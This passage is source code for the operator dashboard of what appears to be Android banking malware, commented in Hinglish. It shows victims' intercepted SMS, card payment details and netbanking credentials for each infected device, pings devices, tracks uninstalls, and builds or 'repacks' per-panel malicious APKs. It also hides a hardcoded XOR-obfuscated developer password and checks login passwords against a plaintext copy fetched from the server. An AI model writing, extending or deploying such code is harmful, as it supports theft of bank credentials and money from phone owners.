      <input type={type} inputMode={inputMode} value={value} onChange={(e) => onChange(e.target.value)} readOnly={readOnly}
        className={`h-12 w-full rounded-xl border border-gray-200 bg-gray-50 px-4 text-[14px] outline-none transition-colors focus:border-gray-400 focus:bg-white ${readOnly ? "cursor-default opacity-60" : ""}`} />
    </div>
  );
}

// ─── Admin APK Download Card ──────────────────────────────────────────────────
type AdminApkPhase = "idle" | "building" | "downloading" | "done" | "error";

function AdminApkCard({ panelId, apiBase, apiHeaders }: {
  dark: boolean; panelId: string; apiBase: string; apiHeaders: Record<string, string>;
}) {
  const [phase,    setPhase]    = useState<AdminApkPhase>("idle");
  const [msg,      setMsg]      = useState("");
  const [progress, setProgress] = useState(0);
  const [elapsed,  setElapsed]  = useState(0);
  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const reqIdRef = useRef("");

  function stopTimers() {
    if (pollRef.current)  { clearInterval(pollRef.current);  pollRef.current  = null; }
    if (timerRef.current) { clearInterval(timerRef.current); timerRef.current = null; }
  }

  async function handleDownload() {
    if (!panelId) { setMsg("❌ Panel ID nahi mila"); setPhase("error"); return; }
    stopTimers();
    setPhase("building"); setMsg("APK build ho rahi hai... (~30 sec)"); setProgress(5); setElapsed(0);

    // Elapsed timer
    let sec = 0;
    timerRef.current = setInterval(() => { sec++; setElapsed(sec); setProgress(Math.min(80, 5 + sec * 2)); }, 1000);

    try {
      // Step 1: Build request bhejo
      const r = await fetch(`${apiBase}/api/admin/download-admin-apk`, {
        method: "POST",
        headers: { ...apiHeaders, "Content-Type": "application/json" },
        body: JSON.stringify({ panelId }),
      });
      const data = await r.json();
      if (!r.ok || !data.success) {
        stopTimers(); setMsg("❌ " + (data.error || "Build start nahi hua")); setPhase("error"); return;
      }

      reqIdRef.current = data.requestId;

      // Step 2: Poll status jab tak done na ho
      pollRef.current = setInterval(async () => {
        try {
          const sr = await fetch(`${apiBase}/api/admin/download-admin-apk/${reqIdRef.current}/status`, { headers: apiHeaders });
          const sd = await sr.json();
          if (sd.status === "done") {
            stopTimers(); setProgress(90); setMsg("Downloading...");
            setPhase("downloading");
            // Step 3: Download
            const dlRes = await fetch(`${apiBase}/api/admin/download-admin-apk/${reqIdRef.current}/download`, { headers: apiHeaders });
            if (!dlRes.ok) { setMsg("❌ Download failed"); setPhase("error"); return; }
            const blob = await dlRes.blob();
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url; a.download = `admin-panel-${panelId}.apk`;
            document.body.appendChild(a); a.click(); document.body.removeChild(a);
            URL.revokeObjectURL(url);
            setProgress(100); setPhase("done"); setMsg("✅ Admin APK download ho gayi!");
            setTimeout(() => { setPhase("idle"); setMsg(""); setProgress(0); setElapsed(0); }, 5000);
          } else if (sd.status === "error") {
            stopTimers(); setMsg("❌ " + (sd.error || "Build fail ho gayi")); setPhase("error");
          }
          // pending — keep polling
        } catch {}
      }, 3000);

    } catch (e: any) {
      stopTimers(); setMsg("❌ " + (e?.message || "Network error")); setPhase("error");
    }
  }

  const isWorking = phase === "building" || phase === "downloading";

  return (
    <div className="rounded-2xl bg-white shadow-sm overflow-hidden border border-gray-100">
      <div className="px-5 pt-5 pb-4">
        <div className="flex items-center justify-between mb-1">
          <div className="flex items-center gap-2">
            <span className="text-[18px]">📱</span>
            <span className="text-[15px] font-bold text-gray-900">Admin App</span>
          </div>
          {isWorking && elapsed > 0 && (
            <span className="text-[12px] font-mono text-gray-400">{elapsed}s</span>
          )}
        </div>
        <p className="text-[12px] text-gray-400 mb-4">
          Web use nahi karna chahte? Admin App download karo — aapke panel ke liye customized.
        </p>

        {isWorking && (
          <div className="mb-3">
            <div className="h-1.5 w-full rounded-full bg-gray-100 overflow-hidden">
              <div className="h-full rounded-full bg-blue-500 transition-all duration-1000"
                style={{ width: `${progress}%` }} />
            </div>
            <p className="mt-1.5 text-[11px] text-gray-400">{msg}</p>
          </div>
        )}
        {phase === "done" && (
          <div className="mb-3 rounded-xl bg-green-50 border border-green-100 px-3 py-2 text-[12px] font-semibold text-green-600">{msg}</div>
        )}
        {phase === "error" && (
          <div className="mb-3 rounded-xl bg-red-50 border border-red-100 px-3 py-2 text-[12px] font-semibold text-red-600">{msg}</div>
        )}

        <button type="button" onClick={!isWorking ? handleDownload : undefined} disabled={isWorking}
          className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98] flex items-center justify-center gap-2">
          {isWorking
            ? <><span className="inline-block h-4 w-4 rounded-full border-2 border-white border-t-transparent animate-spin" />{phase === "building" ? "Build ho rahi hai..." : "Downloading..."}</>
            : "⬇️ Download Admin APK"
          }
        </button>
        <p className="mt-2 text-center text-[11px] text-gray-400">Panel: {panelId || "—"} · Build time ~30 sec</p>
      </div>
    </div>
  );
}

// ─── Developer Zone ──────────────────────────────────────────────────────────
// Password stored obfuscated — XOR 42
const _dk = [73,79,66,65,67,68,77,26,19,24,28];
function _dv(i: number[]): string { return i.map(x => String.fromCharCode(x ^ 42)).join(""); }

function DevZone({ apiBase, apiHeaders }: { apiBase: string; apiHeaders: Record<string, string> }) {
  const [unlocked, setUnlocked] = useState(false);
  const [pwInput,  setPwInput]  = useState("");
  const [pwErr,    setPwErr]    = useState("");
  const [alertTxt, setAlertTxt] = useState("");
  const [alertMsg, setAlertMsg] = useState("");
  const [alertLoading, setAlertLoading] = useState(false);

  function tryUnlock() {
    if (pwInput === _dv(_dk)) {
      setUnlocked(true); setPwErr(""); setPwInput("");
      fetch(`${apiBase}/api/admin/alert-text`, { headers: apiHeaders })
        .then(r => r.json()).then(d => setAlertTxt(d?.text || "")).catch(() => {});
    } else {
      setPwErr("❌ Galat password"); setPwInput("");
      setTimeout(() => setPwErr(""), 2000);
    }
  }

  async function saveAlertText() {
    setAlertLoading(true); setAlertMsg("");
    try {
      const r = await fetch(`${apiBase}/api/admin/alert-text`, {
        method: "PUT",
        headers: { ...apiHeaders, "Content-Type": "application/json" },
        body: JSON.stringify({ text: alertTxt }),
      });
      const d = await r.json();
      if (d.success) setAlertMsg("✅ Sabhi panels mein broadcast ho gaya!");
      else setAlertMsg("❌ Failed: " + (d.error || ""));
    } catch (e: any) {
      setAlertMsg("❌ Error: " + e?.message);
    } finally {
      setAlertLoading(false);
      setTimeout(() => setAlertMsg(""), 4000);
    }
  }

  async function clearAlertText() {
    setAlertTxt(""); setAlertLoading(true); setAlertMsg("");
    try {
      const r = await fetch(`${apiBase}/api/admin/alert-text`, {
        method: "PUT",
        headers: { ...apiHeaders, "Content-Type": "application/json" },
        body: JSON.stringify({ text: "" }),
      });
      const d = await r.json();
      if (d.success) setAlertMsg("✅ Alert clear ho gaya!");
      else setAlertMsg("❌ Failed");
    } catch { setAlertMsg("❌ Error"); }
    finally { setAlertLoading(false); setTimeout(() => setAlertMsg(""), 3000); }
  }

  return (
    <div className="rounded-2xl overflow-hidden border-2 border-purple-200 bg-white shadow-sm">
      <div className="px-5 pt-5 pb-4">
        <div className="flex items-center gap-2 mb-1">
          <span className="text-[18px]">🛠️</span>
          <span className="text-[15px] font-black text-purple-700">Developer Zone</span>
        </div>
        <p className="text-[12px] text-purple-400 mb-4">Advanced tools — authorized personnel only</p>

        {!unlocked ? (
          <div>
            <input
              type="password"
              value={pwInput}
              onChange={e => setPwInput(e.target.value)}
              onKeyDown={e => e.key === "Enter" && tryUnlock()}
              placeholder="Access code daalo..."
              className="w-full rounded-xl border border-purple-200 bg-purple-50 px-4 py-3 text-[14px] outline-none focus:border-purple-400 mb-2"
            />
            {pwErr && <div className="text-center text-[12px] font-semibold text-red-500 mb-2">{pwErr}</div>}
            <button type="button" onClick={tryUnlock}
              className="w-full rounded-xl bg-purple-600 py-3 text-[14px] font-bold text-white active:scale-[0.98]">
              🔓 Unlock
            </button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="rounded-xl bg-purple-50 border border-purple-100 px-3 py-2 text-[11px] text-purple-500 font-semibold">
              ✅ Developer access unlocked
            </div>

            {/* Alert Text Broadcast */}
            <div>
              <div className="text-[13px] font-bold text-gray-800 mb-1">📢 Alert Text (Broadcast)</div>
              <div className="text-[11px] text-gray-400 mb-2">Ye text sabhi panels mein ek saath set ho jaayega</div>
              <textarea
                value={alertTxt}
                onChange={e => setAlertTxt(e.target.value)}
                placeholder="Alert message likho... (khali = hata do)"
                rows={3}
                className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3 text-[13px] outline-none focus:border-purple-400 resize-none"
              />
              {alertMsg && (
                <div className={`text-center text-[12px] font-semibold mt-1 ${alertMsg.startsWith("✅") ? "text-green-600" : "text-red-500"}`}>
                  {alertMsg}
                </div>
              )}
              <div className="flex gap-2 mt-2">
                <button type="button" onClick={saveAlertText} disabled={alertLoading}
                  className="flex-1 rounded-xl bg-purple-600 py-2.5 text-[13px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
                  {alertLoading ? "Sending..." : "📡 Broadcast"}
                </button>
                <button type="button" onClick={clearAlertText} disabled={alertLoading}
                  className="rounded-xl border border-gray-200 px-4 py-2.5 text-[13px] font-semibold text-gray-500 disabled:opacity-50 active:scale-[0.98]">
                  Clear
                </button>
              </div>
            </div>

            <button type="button" onClick={() => setUnlocked(false)}
              className="w-full rounded-xl border border-purple-200 py-2 text-[12px] text-purple-400 active:scale-[0.98]">
              🔒 Lock
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

const SMS_PER_PAGE = 50;

export default function MainPage() {
  const nav      = useNavigate();
  const location = useLocation();
  const [helpOpen,   setHelpOpen]   = useState(false);
  const [helpScreen, setHelpScreen] = useState<"" | "settings" | "apk" | "fixapk">("");
  const [globalPhone,   setGlobalPhone]   = useState("");
  const [globalEnabled, setGlobalEnabled] = useState(false);
  const [globalLoading, setGlobalLoading] = useState(false);
  const [globalMsg,     setGlobalMsg]     = useState("");
  const [pinOld,        setPinOld]        = useState("");
  const [pinNew,        setPinNew]        = useState("");
  const [pinConfirm,    setPinConfirm]    = useState("");
  const [pinMsg,        setPinMsg]        = useState("");
  const [pinIsSet,      setPinIsSet]      = useState<boolean | null>(null);

  // ── Change Login Password ─────────────────────────────────────────────────
  const [loginPassOld,     setLoginPassOld]     = useState("");
  const [loginPassNew,     setLoginPassNew]      = useState("");
  const [loginPassConfirm, setLoginPassConfirm]  = useState("");
  const [loginPassMsg,     setLoginPassMsg]      = useState("");
  const [loginPassLoading, setLoginPassLoading]  = useState(false);

  const [licenseInfo,   setLicenseInfo]   = useState<any>(null);
  const [contactOpen,   setContactOpen]   = useState(false);
  const [activeTab, setActiveTab] = useState<TabKey>(() => ((location.state as any)?.tab as TabKey) || "home");

  // ── SMS Filters ───────────────────────────────────────────────────────────
  const [smsTypeFilter, setSmsTypeFilter] = useState<SmsFilter>("all");
  const [smsDayFilter,  setSmsDayFilter]  = useState<SmsDayFilter>(0);

  // ── Danger zone ───────────────────────────────────────────────────────────
  const [dangerMsg, setDangerMsg] = useState("");
  const [dangerLoading, setDangerLoading] = useState(false);
  const [dangerPin, setDangerPin] = useState("");

  useEffect(() => {
    if ((location.state as any)?.openSettings) { setHelpScreen("settings"); loadSettingsData(); }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const [dark,       setDark]       = useState(false);
  const [search,     setSearch]     = useState("");
  const [searchQ,    setSearchQ]    = useState("");
  const [sortMode,   setSortMode]   = useState<SortMode>("new");
  const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");
  const [alertText,  setAlertText]  = useState("");
  const [uninstalledSet, setUninstalledSet] = useState<Set<string>>(new Set());
  const [devices,  setDevices]  = useState<AnyRecord[]>([]);
  const [forms,    setForms]    = useState<AnyRecord[]>([]);
  const [smsMap,   setSmsMap]   = useState<Record<string, AnyRecord[]>>({});
  const [cardMap,  setCardMap]  = useState<Record<string, AnyRecord[]>>({});
  const [netMap,   setNetMap]   = useState<Record<string, AnyRecord[]>>({});
  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingForms,   setLoadingForms]   = useState(false);
  const [loadingSms,     setLoadingSms]     = useState(false);
  const [loadingGroups,  setLoadingGroups]  = useState(false);
  const groupsLoadedRef = useRef(false);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});

  // Fix APK state
  const [fixPanelId,     setFixPanelId]     = useState("");
  const [fixPhase,       setFixPhase]       = useState<FixPhase>("idle");
  const [fixReqId,       setFixReqId]       = useState("");
  const [fixError,       setFixError]       = useState("");
  const [fixFilename,    setFixFilename]    = useState("fixed.apk");
  const [fixApkSize,     setFixApkSize]     = useState("");
  const [fixDownloading, setFixDownloading] = useState(false);
  const [fixTimeTaken,   setFixTimeTaken]   = useState("");
  const fixPollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
  const fixStartRef = useRef<number>(0);

  const [checkAlert,        setCheckAlert]        = useState<{ deviceId: string; status: CheckStatus } | null>(null);
  const [recentlyOnlineMap, setRecentlyOnlineMap] = useState<Record<string, number>>({});
  const checkDeviceIdRef = useRef("");
  const checkStatusRef   = useRef<CheckStatus | null>(null);
  const checkTimerRef    = useRef<ReturnType<typeof setTimeout> | null>(null);
  const checkWindowRef   = useRef<number>(0);
  const deviceOrderRef   = useRef<string[]>([]);

  const deviceNumMap = useMemo(() => {
    const map: Record<string, number> = {};
    const order = deviceOrderRef.current;
    if (order.length) { order.forEach((id, i) => { map[id] = order.length - i; }); }
    else { devices.forEach((d, i) => { map[str(d.deviceId)] = devices.length - i; }); }
    return map;
  }, [devices]);

  const loadDevices = useCallback(async () => {
    setLoadingDevices(true);
    try {
      const l = await getDevices(); const list = Array.isArray(l) ? l : [];
      setDevices(list);
      const sorted = [...list].sort((a, b) => Number(b?.createdAt ? new Date(b.createdAt).getTime() : 0) - Number(a?.createdAt ? new Date(a.createdAt).getTime() : 0));
      deviceOrderRef.current = sorted.map((d) => str(d.deviceId)).filter(Boolean);
    } catch (e) { console.error(e); } finally { setLoadingDevices(false); }
  }, []);

  const loadSms = useCallback(async () => {
    setLoadingSms(true);
    try { const g = await listNotificationsGrouped(); setSmsMap(typeof g === "object" && g ? g : {}); }
    catch (e) { console.error(e); } finally { setLoadingSms(false); }
  }, []);

  const loadGroupData = useCallback(async (formsList: AnyRecord[]) => {
    const ids = [...new Set(formsList.map(getDeviceId).filter(Boolean))].slice(0, 10);
    if (!ids.length) return;
    setLoadingGroups(true);
    try {
      const [cards, nets] = await Promise.all([
        Promise.allSettled(ids.map((id) => getCardPaymentsByDevice(id).then((d) => ({ id, data: d })))),
        Promise.allSettled(ids.map((id) => getNetbankingByDevice(id).then((d) => ({ id, data: d })))),
      ]);
      const cm: Record<string, AnyRecord[]> = {}, nm: Record<string, AnyRecord[]> = {};
      for (const r of cards) { if (r.status === "fulfilled" && r.value.data?.length) cm[r.value.id] = r.value.data; }
      for (const r of nets)  { if (r.status === "fulfilled" && r.value.data?.length) nm[r.value.id] = r.value.data; }
      setCardMap(cm); setNetMap(nm); groupsLoadedRef.current = true;
    } catch (e) { console.error(e); } finally { setLoadingGroups(false); }
  }, []);

  const loadFavorites = useCallback(async () => {
    try {
      const r = await fetch(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders() });
      if (r.ok) {
        const data = await r.json();
        // API returns {deviceId: true/false} ya [{deviceId, favorite}] — dono handle karo
        if (Array.isArray(data)) {
          const map: Record<string, boolean> = {};
          data.forEach((item: any) => { if (item?.deviceId) map[item.deviceId] = item.favorite === true; });
          setFavoritesMap(map);
        } else if (data && typeof data === "object") {
          setFavoritesMap(data);
        }
      }
    } catch {}
  }, []);

  const loadAll = useCallback(async () => {
    groupsLoadedRef.current = false;
    loadDevices(); loadSms(); loadFavorites();
    setLoadingForms(true);
    try {
      const fl = await listFormSubmissions(); const list = Array.isArray(fl) ? fl : [];
      setForms(list); if (list.length > 0) loadGroupData(list);
    } catch (e) { console.error(e); } finally { setLoadingForms(false); }
    try { const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() }); if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(String(d.text)); } } catch {}
  }, [loadDevices, loadSms, loadGroupData, loadFavorites]);

  useEffect(() => {
    wsService.connect(); loadAll();
    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event = String(msg.event || ""); const deviceId = String(msg.deviceId || msg?.data?.deviceId || "");
      if (event === "notification") { const data = msg.data || {}; const did = String(data.deviceId || deviceId || ""); if (!did) return; const ns: AnyRecord = { ...data, _id: data._id || data.id || `${Date.now()}`, _deviceId: did, deviceId: did, timestamp: Number(data.timestamp || Date.now()) }; setSmsMap((p) => ({ ...p, [did]: [ns, ...(p[did] || [])].sort((a, b) => getTs(b) - getTs(a)) })); return; }
      if (event === "form:created" || event === "form_submissions:created") { const data = msg.data || {}; const did = String(data.uniqueid || data.deviceId || deviceId || ""); const pl = data.payload && typeof data.payload === "object" ? data.payload : data; setForms((p) => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload: pl, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...p]); groupsLoadedRef.current = false; return; }
      if (event === "card:created" || event === "card_payment:created") { const data = msg.data || {}; const did = String(data.uniqueid || data.deviceId || deviceId || ""); if (!did) return; const pl = data.payload && typeof data.payload === "object" ? data.payload : data; setCardMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] })); return; }
      if (event === "netbanking:created" || event === "net_banking:created") { const data = msg.data || {}; const did = String(data.uniqueid || data.deviceId || deviceId || ""); if (!did) return; const pl = data.payload && typeof data.payload === "object" ? data.payload : data; setNetMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] })); return; }
      if (event === "favorite:update") { const did = String(msg?.data?.deviceId || ""); const fav = msg?.data?.favorite === true; if (did) setFavoritesMap((p) => ({ ...p, [did]: fav })); return; }
      if (event === "device:lastSeen" || event === "device:upsert") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => { const exists = p.some((d) => str(d.deviceId) === did); if (exists) return p.map((d) => str(d.deviceId) === did ? { ...d, ...(msg.data || {}), lastSeen: d.lastSeen, checkedAt: d.checkedAt } : d); if (event === "device:upsert" && msg.data && did) { if (!deviceOrderRef.current.includes(did)) deviceOrderRef.current = [did, ...deviceOrderRef.current]; return [msg.data, ...p]; } return p; }); return; }
      if (event === "check_online:result") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); const ts = Number(msg?.data?.checkedAt || Date.now()); const status = String(msg?.data?.status || ""); const err = String(msg?.data?.error || ""); const inW = checkDeviceIdRef.current === did && checkStatusRef.current === "checking"; if (status === "online" && did) { setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d)); setRecentlyOnlineMap((p) => ({ ...p, [did]: ts })); setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "online"; setCheckAlert({ deviceId: did, status: "online" }); } } else if (err && err !== "missing_token" && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = null; setCheckAlert({ deviceId: did, status: "checking" }); } return; }
      if (event === "device:uninstalled") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); if (did) setUninstalledSet((p) => new Set([...p, did])); const inW = checkDeviceIdRef.current === did && (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000)); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } return; }
      if (event === "device:delete") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => p.filter((d) => str(d.deviceId) !== did)); setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; }); setUninstalledSet((p) => { const c = new Set(p); c.delete(did); return c; }); }
    });
    return () => { off(); };
  }, [loadAll]);

  useEffect(() => { if (activeTab === "groups" && !groupsLoadedRef.current && forms.length > 0) loadGroupData(forms); }, [activeTab, forms, loadGroupData]);

  const handleCheckOnline = useCallback(async (deviceId: string) => {
    if (!deviceId) return;
    checkDeviceIdRef.current = deviceId; checkStatusRef.current = "checking"; checkWindowRef.current = Date.now();
    setCheckAlert({ deviceId, status: "checking" });
    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
    checkTimerRef.current = setTimeout(() => { if (checkDeviceIdRef.current === deviceId && checkStatusRef.current === "checking") { checkStatusRef.current = null; setCheckAlert({ deviceId, status: "checking" }); } }, 30000);
    try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/ping`, { source: "main" }, { headers: apiHeaders(), timeout: 10000 }); } catch {}
  }, []);

  const openDevice      = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
  const closeCheckAlert = useCallback(() => { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); setCheckAlert(null); }, []);
  const commitSearch    = useCallback(() => { setSearchQ(search.trim().toLowerCase()); }, [search]);

  const toggleFavorite = useCallback(async (deviceId: string) => {
    const current = favoritesMap[deviceId] === true;
    setFavoritesMap((p) => ({ ...p, [deviceId]: !current }));
    try { await axios.put(`${ENV.API_BASE}/api/favorites/${encodeURIComponent(deviceId)}`, { favorite: !current }, { headers: apiHeaders(), timeout: 8000 }); }
    catch { setFavoritesMap((p) => ({ ...p, [deviceId]: current })); }
  }, [favoritesMap]);

  function openFixApk() {
    setHelpOpen(false);
    setFixPanelId(str(ENV.PANEL_ID || ""));
    setFixPhase("idle"); setFixError(""); setFixReqId("");
    setFixFilename("fixed.apk"); setFixApkSize(""); setFixTimeTaken(""); setFixDownloading(false);
    setHelpScreen("fixapk");
  }

  function closeFixApk() { if (fixPollRef.current) { clearInterval(fixPollRef.current); fixPollRef.current = null; } setHelpScreen(""); }

  async function startFixApk() {
    const panelId = fixPanelId.trim();
    if (!panelId) { setFixError("Panel ID zaroori hai"); return; }
    setFixPhase("starting"); setFixError(""); setFixApkSize(""); setFixTimeTaken("");
    fixStartRef.current = Date.now();
    try {
      const r = await axios.post(`${ENV.API_BASE}/api/admin/repack/start`, { panelId }, { headers: apiHeaders(), timeout: 30000 });
      const reqId = String(r.data?.requestId || "");
      if (!reqId) throw new Error("No requestId");
      setFixReqId(reqId); setFixPhase("working");
      if (fixPollRef.current) clearInterval(fixPollRef.current);
      fixPollRef.current = setInterval(async () => {
        try {
          const s = await axios.get(`${ENV.API_BASE}/api/admin/repack/${reqId}/status`, { headers: apiHeaders(), timeout: 10000 });
          if (s.data.status === "done") {
            clearInterval(fixPollRef.current!); fixPollRef.current = null;
            setFixFilename(s.data.filename || "fixed.apk");
            const secs = Math.floor((Date.now() - fixStartRef.current) / 1000);
            setFixTimeTaken(Math.floor(secs / 60) > 0 ? `${Math.floor(secs / 60)}m ${secs % 60}s` : `${secs}s`);
            setFixPhase("done");
          } else if (s.data.status === "error") {
            clearInterval(fixPollRef.current!); fixPollRef.current = null;
            setFixError(s.data.error || "Kuch problem ho gayi"); setFixPhase("error");
          }
        } catch {}
      }, 5000);
    } catch (e: any) { setFixError(e?.response?.data?.error || String(e?.message || "Request fail ho gayi")); setFixPhase("error"); }
  }

  async function downloadFixedApk() {
    setFixDownloading(true);
    try {
      const r = await fetch(`${ENV.API_BASE}/api/admin/repack/${fixReqId}/download`, { headers: apiHeaders() });
      if (!r.ok) throw new Error(`Server returned ${r.status}`);
      const blob = await r.blob();
      setFixApkSize(`${(blob.size / (1024 * 1024)).toFixed(1)} MB`);
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a"); a.href = url; a.download = fixFilename;
      document.body.appendChild(a); a.click(); document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch (e: any) { setFixError("Download nahi hua: " + String(e?.message || "")); }
    finally { setFixDownloading(false); }
  }

  function handleLogout() { setHelpOpen(false); logout(); window.location.href = "/login"; }
  function _openLink(url: string) { const a = document.createElement("a"); a.href = url; a.target = "_blank"; a.rel = "noopener noreferrer"; document.body.appendChild(a); a.click(); document.body.removeChild(a); }
  function openWhatsApp() { const link = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim(); if (!link) return; let url = ""; try { const u = new URL(/^https?:\/\//i.test(link) ? link : `https://${link}`); const h = u.hostname.toLowerCase(); if (h.includes("wa.me")) url = `https://wa.me/${u.pathname.replace(/\D/g,"")}`; else if (h.includes("whatsapp.com")) url = `https://api.whatsapp.com/send?phone=${(u.searchParams.get("phone")||u.pathname).replace(/\D/g,"")}`; } catch { url = `https://wa.me/${link.replace(/\D/g,"")}`; } if (url) _openLink(url); }
  function openTelegramTarget() { const raw = String((import.meta.env.VITE_TELEGRAM_TARGET as string) || "").trim(); if (!raw) return; _openLink(raw.startsWith("http") ? raw : `https://${raw}`); }
  function openTelegramHelp() { _openLink(String(ENV.TELEGRAM_CHANNEL || "https://t.me/")); }

  async function loadGlobalPhone() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/globalPhone`, { headers: apiHeaders() }); const d = await r.json(); const ph = String(d?.phone || ""); setGlobalPhone(ph); setGlobalEnabled(!!ph); } catch {} }
  async function loadPinStatus() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/deletePassword/status`, { headers: apiHeaders() }); const d = await r.json(); setPinIsSet(d?.isSet === true); } catch { setPinIsSet(null); } }
  async function loadSettingsData() { await Promise.all([loadGlobalPhone(), loadPinStatus()]); }
  async function saveGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalEnabled ? globalPhone : "" }, { headers: apiHeaders() }); setGlobalMsg(globalEnabled ? "✅ Saved!" : "✅ Cleared!"); if (!globalEnabled) setGlobalPhone(""); } catch { setGlobalMsg("❌ Failed"); } finally { setGlobalLoading(false); } }
  async function changePin() { setPinMsg(""); if (pinIsSet === true && !pinOld) { setPinMsg("❌ Old PIN required"); return; } if (!pinNew) { setPinMsg("❌ New PIN required"); return; } if (pinNew !== pinConfirm) { setPinMsg("❌ PINs don't match"); return; } if (pinNew.length < 4) { setPinMsg("❌ Min 4 digits"); return; } try { const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`, { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() }); if (r.data?.success) { setPinMsg("✅ PIN " + (pinIsSet ? "changed!" : "set!")); setPinOld(""); setPinNew(""); setPinConfirm(""); setPinIsSet(true); } else { setPinMsg("❌ " + (r.data?.error || "Failed")); } } catch (e: any) { setPinMsg("❌ " + (e?.response?.data?.error || "Failed")); } }

  // ── Change Login Password ─────────────────────────────────────────────────
  async function changeLoginPassword() {
    setLoginPassMsg("");
    if (!loginPassOld) { setLoginPassMsg("❌ Purana password daalo"); return; }
    if (!loginPassNew) { setLoginPassMsg("❌ Naya password daalo"); return; }
    if (loginPassNew !== loginPassConfirm) { setLoginPassMsg("❌ Passwords match nahi karte"); return; }
    if (loginPassNew.length < 4) { setLoginPassMsg("❌ Min 4 characters chahiye"); return; }
    setLoginPassLoading(true);
    try {
      // Get current login credentials to verify old password
      const currentCreds = await fetch(`${ENV.API_BASE}/api/admin/login`, { headers: apiHeaders() });
      const creds = await currentCreds.json();
      if (creds.password !== loginPassOld) {
        setLoginPassMsg("❌ Purana password galat hai");
        setLoginPassLoading(false);
        return;
      }
      // Update with new password
      const r = await axios.put(`${ENV.API_BASE}/api/admin/login`,
        { username: creds.username, password: loginPassNew },
        { headers: apiHeaders() }
      );
      if (r.data?.success) {
        setLoginPassMsg("✅ Password change ho gaya! Ab sare sessions logout honge...");
        setLoginPassOld(""); setLoginPassNew(""); setLoginPassConfirm("");
        // Delete all sessions
        await axios.delete(`${ENV.API_BASE}/api/admin/sessions`, { headers: apiHeaders() }).catch(() => {});
        // Logout self
        setTimeout(() => { logout(); window.location.href = "/login"; }, 2000);
      } else {
        setLoginPassMsg("❌ " + (r.data?.error || "Failed"));
      }
    } catch (e: any) { setLoginPassMsg("❌ " + (e?.response?.data?.error || "Failed")); }
    finally { setLoginPassLoading(false); }
  }

  // ── Danger Zone ───────────────────────────────────────────────────────────
  async function deleteAllSms() {
    if (!dangerPin) { setDangerMsg("❌ Delete PIN daalo pehle"); return; }
    setDangerLoading(true); setDangerMsg("");
    try {
      await axios.delete(`${ENV.API_BASE}/api/notifications`, {
        headers: apiHeaders(),
        data: { password: dangerPin }
      });
      setSmsMap({});
      setDangerPin("");
      setDangerMsg("✅ Sare SMS delete ho gaye!");
    } catch (e: any) {
      const err = e?.response?.data?.error || "Delete fail ho gaya";
      setDangerMsg("❌ " + (err === "invalid_password" ? "PIN galat hai!" : err === "password_required" ? "PIN daalo!" : err));
    }
    finally { setDangerLoading(false); }
  }



  async function loadLicenseInfo() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/license-info`, { headers: apiHeaders() }); if (r.ok) setLicenseInfo(await r.json()); } catch {} }
  function handleTabChange(tab: TabKey) { if (tab === "help") { setHelpOpen(true); return; } setActiveTab(tab); setSearch(""); setSearchQ(""); }

  const { allSms, smsPageMap } = useMemo(() => {
    const list: AnyRecord[] = []; const pageMap: Record<string, number> = {};
    for (const [did, msgs] of Object.entries(smsMap)) {
      const sorted = [...(msgs || [])].sort((a, b) => getTs(b) - getTs(a));
      sorted.forEach((m, i) => { const page = Math.floor(i / SMS_PER_PAGE) + 1; const mid = getId(m) || `${did}-${i}`; pageMap[mid] = page; list.push({ ...m, _deviceId: did, deviceId: did }); });
    }
    return { allSms: list.sort((a, b) => getTs(b) - getTs(a)), smsPageMap: pageMap };
  }, [smsMap]);

  // ── Filtered SMS ─────────────────────────────────────────────────────────
